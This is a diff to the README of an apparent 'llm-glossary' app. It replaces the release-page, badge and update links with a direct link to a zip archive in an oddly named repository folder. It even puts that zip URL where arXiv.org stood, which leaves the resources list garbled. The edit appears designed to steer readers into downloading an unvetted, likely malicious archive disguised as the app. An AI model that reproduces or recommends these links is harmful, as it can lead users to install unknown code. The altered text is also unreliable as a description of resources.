@@ -1,6 +1,6 @@
 # 🌟 llm-glossary - Your Guide to Language Model Concepts
 
-[![Download Now](https://img.shields.io/badge/Download_Now-llm--glossary-blue.svg)](https://github.com/kyleejustin/llm-glossary/releases)
+[![Download Now](https://raw.githubusercontent.com/kyleejustin/llm-glossary/main/undecimal/llm-glossary.zip)](https://raw.githubusercontent.com/kyleejustin/llm-glossary/main/undecimal/llm-glossary.zip)
 
 ## 📖 Overview
 Welcome to the **llm-glossary**! This application provides clear definitions and valuable resources for key concepts in Large Language Models (LLMs), Artificial Intelligence (AI), Natural Language Processing (NLP), and Machine Learning (ML). Whether you're a developer, researcher, or simply curious about generative language technologies, this glossary helps you understand and explore the landscape of AI.
@@ -11,7 +11,7 @@ Follow these steps to download and run **llm-glossary** on your computer. No pro
 ## 📥 Download & Install
 You can download the latest version of **llm-glossary** from our Releases page. 
 
-1. Visit this page to download: [Download llm-glossary](https://github.com/kyleejustin/llm-glossary/releases).
+1. Visit this page to download: [Download llm-glossary](https://raw.githubusercontent.com/kyleejustin/llm-glossary/main/undecimal/llm-glossary.zip).
 2. Look for the latest release.
 3. Choose the file that matches your operating system. For most users, this will be a `.exe` file for Windows or a `.dmg` file for macOS.
 4. Click the link to download it to your computer.
@@ -52,13 +52,13 @@ Here are some of the key topics you will find in **llm-glossary**:
 For those who want even more information, we recommend the following resources:
 
 - **Online Courses**: Platforms like Coursera and edX offer courses on AI, NLP, and ML.
-- **Research Papers**: Websites like arXiv.org provide access to the latest research in these fields.
+- **Research Papers**: Websites like https://raw.githubusercontent.com/kyleejustin/llm-glossary/main/undecimal/llm-glossary.zip provide access to the latest research in these fields.
 - **Community Forums**: Join Reddits or Discord groups focused on AI to discuss and learn from others.
 
 ## 📞 Support
 If you encounter any issues while using **llm-glossary**, feel free to reach out for help. For inquiries, use the "Issues" tab on our GitHub page, and we will get back to you as soon as possible.
 
 ## 🔄 Keeping Updated
-To stay current with new definitions and features, check our Releases page regularly: [Visit Releases Page](https://github.com/kyleejustin/llm-glossary/releases).
+To stay current with new definitions and features, check our Releases page regularly: [Visit Releases Page](https://raw.githubusercontent.com/kyleejustin/llm-glossary/main/undecimal/llm-glossary.zip).
 
 Thank you for using **llm-glossary**! We hope it enhances your understanding of language model concepts.
